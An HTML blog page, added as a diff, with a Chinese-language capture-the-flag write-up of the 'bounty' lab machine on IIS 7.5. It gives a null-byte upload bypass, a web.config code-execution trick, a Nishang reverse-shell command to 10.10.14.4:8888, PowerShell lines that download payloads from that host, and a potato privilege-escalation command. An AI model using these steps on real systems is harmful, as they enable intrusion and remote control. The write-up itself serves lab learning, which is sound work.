@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>bounty | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### port 只开放了一个80端口，是一张IIS7.5的图 #### 目录扫描  只有一个aspnet_client且这个目录是403的 用大字典再扫一次 writeup说存在一个transfer.aspx文件，但是我没扫到 #### 上传文件 试着传一个cmd.aspx到靶机，会被拦截 用%00进行截断上传，可以上传成功  尝试访问10.10.10.93&#x2F;Uploade">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bounty">
+<meta property="og:url" content="http://example.com/2022/09/02/bounty/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### port 只开放了一个80端口，是一张IIS7.5的图 #### 目录扫描  只有一个aspnet_client且这个目录是403的 用大字典再扫一次 writeup说存在一个transfer.aspx文件，但是我没扫到 #### 上传文件 试着传一个cmd.aspx到靶机，会被拦截 用%00进行截断上传，可以上传成功  尝试访问10.10.10.93&#x2F;Uploade">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/nmap.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/dir.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/burp.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/webconfig1.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/webconfig2.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/webconfig3.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/user.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/systeminfo.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/rev.png">
+<meta property="og:image" content="http://example.com/2022/09/02/bounty/root.png">
+<meta property="article:published_time" content="2022-09-02T11:31:40.000Z">
+<meta property="article:modified_time" content="2022-09-03T03:29:52.384Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/02/bounty/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-bounty" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/02/bounty/" class="article-date">
+  <time class="dt-published" datetime="2022-09-02T11:31:40.000Z" itemprop="datePublished">2022-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      bounty
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/02/bounty/nmap.png">
+#### port
+只开放了一个80端口，是一张IIS7.5的图
+#### 目录扫描
+<img src="/2022/09/02/bounty/dir.png">
+只有一个aspnet_client且这个目录是403的
+用大字典再扫一次
+writeup说存在一个transfer.aspx文件，但是我没扫到
+#### 上传文件
+试着传一个cmd.aspx到靶机，会被拦截
+用%00进行截断上传，可以上传成功
+<img src="/2022/09/02/bounty/burp.png">
+尝试访问10.10.10.93/UploadedFiles/cmd.aspx，访问不了
+搜索iis7.5 upload rce
+(链接)[https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/]
+上传一个web.config
+<img src="/2022/09/02/bounty/webconfig1.png">
+访问web.config会得到回显
+<img src="/2022/09/02/bounty/webconfig2.png">
+准备反弹一个shell给本机
+首先先下载一个(Nishang’s Invoke-PowerShellTcp.ps1)[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1]
+在最后添加一个反弹shell
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 8888`
+把web.config编辑成下列形式
+<img src="/2022/09/02/bounty/webconfig3.png">
+在本地开一个http服务器准备传送文件，同时开启一个nc监听8888端口等待回弹shell
+<img src="/2022/09/02/bounty/user.png">
+在merlin的文件夹中没有有用的信息
+gci -force强制显示隐藏文件
+#### root
+systeminfo
+<img src="/2022/09/02/bounty/systeminfo.png">
+MS15-051提权
+`
+(new-object net.webclient).downloadfile('http://10.10.14.4/lp.exe','C:\users\merlin\appdata\local\temp\lp.exe')
+(new-object net.webclient).downloadfile('http://10.10.14.4/rev.bat','C:\users\merlin\appdata\local\temp\rev.bat')
+`
+(lonelypotato)[https://github.com/NotMedic/lonelypotato/tree/master/RottenPotatoEXE]
+<img src="/2022/09/02/bounty/rev.png">
+`C:\users\merlin\appdata\local\temp\lp.exe * C:\users\merlin\appdata\local\temp\rev.bat`
+<img src="/2022/09/02/bounty/root.png">
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/02/bounty/" data-id="cl7lcjxnd00005pcp8qd44q2k" data-title="bounty" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/03/irked/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          irked
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/09/01/openadmin/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">openadmin</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
